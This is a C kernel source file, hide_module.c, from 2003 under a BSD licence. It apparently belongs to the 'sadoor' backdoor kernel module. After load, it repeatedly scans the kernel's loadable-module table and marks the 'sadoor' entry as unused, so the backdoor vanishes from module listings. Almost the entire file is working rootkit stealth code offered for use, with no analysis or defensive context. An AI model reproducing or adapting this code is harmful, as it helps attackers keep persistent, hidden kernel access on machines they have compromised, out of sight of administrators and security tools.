/*
 *  File: hide_module.c
 *  Author: Claes M. Nyberg <md0claes@mdstud.chalmers.se>
 *  Description: Module hiding routines
 *  Version: 1.0
 *  Date: Thu Jul  3 15:48:22 CEST 2003
 *
 *  Copyright (c) 2003 Claes M. Nyberg <md0claes@mdstud.chalmers.se>
 *  All rights reserved, all wrongs reversed.
 *
 *  Redistribution and use in source and binary forms, with or without
 *  modification, are permitted provided that the following conditions
 *  are met: 
 *
 *  1. Redistributions of source code must retain the above copyright
 *     notice, this list of conditions and the following disclaimer.
 *  2. Redistributions in binary form must reproduce the above copyright
 *     notice, this list of conditions and the following disclaimer in the
 *     documentation and/or other materials provided with the distribution.
 *  3. The name of author may not be used to endorse or promote products
 *     derived from this software without specific prior written permission.
 *      
 *  THIS SOFTWARE IS PROVIDED ``AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES,
 *  INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY
 *  AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL
 *  THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 *  EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
 *  PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS;
 *  OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,
 *  WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR
 *  OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF
 *  ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. 
 */     

#include <sys/param.h>
#include <sys/uio.h>
#include <sys/kernel.h>
#include <sys/vnode.h>
#include <sys/malloc.h>
#include <sys/mount.h>
#include <sys/exec.h>
#include <sys/syscallargs.h>
#include <sys/conf.h>
#include <sys/lkm.h>
#include <sys/syscall.h>
#include "sadoor.h"

#ifdef SAKMOD_HIDE_MODULE

/* From sys/kern/kern_lkm.c */
#ifndef MAXLKMS
#define MAXLKMS     20
#endif

static int hide_module_byname(u_char *);
static void hide_module_scan(void *);

/* Module table timeout */
struct callout hide_module_callout;

/*
 * Hide the module by marking it's slot as free in the
 * table of loaded modules.
 * Since the module needs to be loaded before we can do 
 * this, we wait half a second before we try.
 */
void
hide_module(void)
{
	callout_reset(&hide_module_callout, hz/2, hide_module_scan, NULL);
}


/*
 * Scan the table until our module is removed.
 */
void
hide_module_scan(void *dummy)
{
	if (hide_module_byname("sadoor") == -1) 
		callout_reset(&hide_module_callout, hz/2, hide_module_scan, NULL);
}


/*
 * Hide module by name, returns 0 on success, -1 on error.
 */
int
hide_module_byname(u_char *name)
{
    struct lkm_table *lkmods = (struct lkm_table *)SAKMOD_HIDE_MODULE;
    int s;
    int i;
 
    /* Find the file by name */
    for (i = 0; i < MAXLKMS; i++) {
    
        if (lkmods[i].used && !strcmp(lkmods[i].private.lkm_any->lkm_name, name)) {
            s = splhigh();
                lkmods[i].used = 0;
            splx(s);
            return(0);
        }
    }
	return(-1);	
}

#endif /* SAKMOD_HIDE_MODULE */

